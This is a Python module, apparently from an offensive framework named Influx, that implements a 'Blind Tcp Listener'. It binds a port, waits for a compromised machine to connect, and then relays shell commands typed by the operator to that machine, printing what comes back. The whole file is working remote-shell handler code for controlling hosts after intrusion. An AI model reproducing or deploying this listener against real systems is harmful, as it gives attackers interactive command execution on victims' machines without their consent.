from socket import *
import sys
import os
#Influx Default Modules Import
Modules_Path = os.path.abspath(os.path.join('..', '..', 'Modules'))
sys.path.append(Modules_Path)
from Modules.InfluxPrint import *
from Modules.InfluxExceptions import *

class infmod:
  #Influx Section
   def __init__(self):
       self.name = "Blind Tcp Listener"
       self.description = "This Module Will Listen For Blind Tcp Connections Created With Influx.\n   Set The Value Of Host any For Any Host(Connection)"
       self.parameters = {"Host":None, "Port":None}
     #...

   def __str__(self):
       return "[" + self.name + "] Influx Module Object."

   def run(self):
     influx_module_main(self.parameters)


def influx_module_main(prams):
   try:
      if prams["Host"] == 'any':
         HOST = ''
      else:
         HOST = prams["Host"]
      PORT = int(prams["Port"])
      s = socket(AF_INET, SOCK_STREAM)
      s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
      s.bind((HOST, PORT))
      if prams["Host"] == "any":
         print(Status["JOB"] + "Listening on 0.0.0.0(any):{0}".format(str(PORT)))
      else:
         print(Status["JOB"] + "Listening on {0}:{1}".format(str(HOST),str(PORT)))
      s.listen(10)
      conn, addr = s.accept()
      print(Status["INFO"] + "Connected To", addr)
      data = conn.recv(1024)
      print(Status["INFO"] + "Type quit For Exit")
      while 1:
         command = raw_input("Enter Shell Command: ")
         conn.send(command)
         if command == "quit": break
         data = conn.recv(1024)
         print(data)
      conn.close()
   except KeyboardInterrupt:
      raise ModuleKeyboardInterrupt()
   except:
      raise StopModuleException("Something Went Wrong")
